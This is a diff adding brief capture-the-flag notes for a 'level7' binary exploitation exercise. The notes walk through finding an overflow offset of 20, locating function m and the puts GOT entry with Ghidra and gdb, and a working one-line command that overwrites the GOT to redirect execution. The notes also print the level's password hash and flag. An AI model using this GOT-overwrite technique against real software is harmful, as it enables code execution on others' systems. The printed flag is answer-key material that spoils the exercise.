@@ -1,0 +1,15 @@
+level7 : f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+Process:
+    - ./level7 --> segfault
+    - ./level7 aa bb --> print(~~)
+    - ./level7 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa a --> segfault
+    - offset = 20
+    - ghydra we have to call function m because this function print the globale variable c
+    - variable c value = .pass content (main)
+    - We have to call function m --> replace puts
+    - gdb ./level7
+    - p m to get adress function m = 0x80484f4
+    - disas puts --> see steps function
+    - we see the function jmp to 0x8049928
+    - ./level7 $(python -c 'print("A"*20 + "\x28\x99\x04\x08")') $(python -c 'print("\xf4\x84\x04\x08")')
+    - get the flag : 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
